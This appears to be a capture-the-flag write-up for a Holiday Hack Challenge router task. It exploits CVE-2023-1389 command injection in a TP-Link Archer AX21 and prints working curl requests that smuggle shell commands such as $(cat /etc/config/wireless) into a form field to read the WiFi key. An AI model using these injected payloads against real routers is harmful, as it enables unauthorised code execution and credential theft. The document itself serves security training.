# TASK 14 - Dosis Network Down
Difficulty: ❄️❄️

[Direct Link](https://dosis-network-down.holidayhackchallenge.com/?&challenge=termDosisNetwork)

## OBJECTIVE : ##
>Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router's config?


## HINTS: ##
<details>
  <summary>Hints provided for Task 14</summary>
  
>-	**Version:** I can't believe nobody created a backup account on our main router...the only thing I can think of is to check the version number of the router to see if there are any...ways around it...
>-  **UCI:** You know...if my memory serves me correctly...there was a lot of fuss going on about a UCI (I forgot the exact term...) for that router.
</details>
 
#  

## PROCEDURE : ##

At the 24-7 shop, Janusz tells us that the gnomes have somehow managed to change the wifi router's admin password and 'probably mucked up' all its settings. 

We are greeted by a login prompt asking us for a password.  The screen tells us that the Hardware version is AX21 v2.0.  If we follow the suggestion in the hint and search for "archer ax21 v2.0 uci vulnerability", the top result is a [statement issued by TP-Link](https://www.tp-link.com/us/support/faq/3643/) regarding a Remote Code execution Vulnerability **[CVE-2023-1389](https://www.exploit-db.com/exploits/51677)**.  This in turn points us to [this handy forum post](https://osintteam.blog/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94) which gives very detailed instructions on how to exploit the vulnerability.

Armed with this information we can try to get the router to execute code remotely using the exploit.  First I got it to execute the `ls` command (note that the command has to be executed twice to give an output):

```
└─$ curl -k -X POST \
  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(ls)
OK

└─$ curl -k -X POST \
  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(ls)'

bin
cgi-bin
dev
etc
home
lib
lib64
mnt
opt
proc
root
sbin
sys
tmp
usr
var
www
```

Then it was simply a case of finding the config file for the wifi network and reading the password from it:

```
┌──(test㉿KaliServer1)-[~]
└─$ curl -k -X POST \
  "https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country" -d 'operation=write&country=$(cat /etc/config/wireless)'

...
...
...

config wifi-iface 'default_radio0'
        option device 'radio0'
        option network 'lan'
        option mode 'ap'
        option ssid 'DOSIS-247_2.4G'
        option encryption 'psk2'
        option key 'SprinklesAndPackets2025!'

config wifi-iface 'default_radio1'
        option device 'radio1'
        option network 'lan'
        option mode 'ap'
        option ssid 'DOSIS-247_5G'
        option encryption 'psk2'
        option key 'SprinklesAndPackets2025!'
```





